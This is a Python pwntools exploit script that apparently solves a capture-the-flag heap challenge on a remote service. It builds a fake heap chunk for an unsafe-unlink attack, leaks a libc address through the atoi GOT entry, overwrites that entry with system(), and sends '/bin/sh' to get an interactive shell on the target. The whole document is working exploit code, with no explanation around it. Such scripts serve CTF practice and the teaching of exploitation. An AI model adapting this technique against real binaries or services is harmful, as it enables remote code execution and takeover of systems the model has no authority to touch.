#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
host = 'csie.ctf.tw'
port = 10138

r = remote(host, port)
atoi_got = 0x602068

def add_item(size, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)

def show():
    r.recvuntil(":")
    r.sendline("1")

def change(idx, size, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)

def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

add_item(0x90, "aaaa")
add_item(0x90, "aaaa")
add_item(0x90, "aaaa")

chunk = p64(0) + p64(0x91) #prev_size, size
chunk += p64(0x6020d8 - 0x18) + p64(0x6020d8 - 0x10) #fd, bk
chunk += "a"*0x70
chunk += p64(0x90) + p64(0xa0) #prev_size2, size2

change(1, 0x100, chunk)
remove(2)

# Leak libc address
change(1, 0x100, p64(0x90) + p64(atoi_got))
show()
libc = u64(r.recvuntil("1 :")[4:-3].ljust(8, '\x00')) - 0x36e80
print "[*] Leak libc address", hex(libc)
system = libc + 0x45390

# GOT hijacking
change(0, 0x100, p64(system))
r.recvuntil(":")
r.sendline("/bin/sh")
r.interactive()
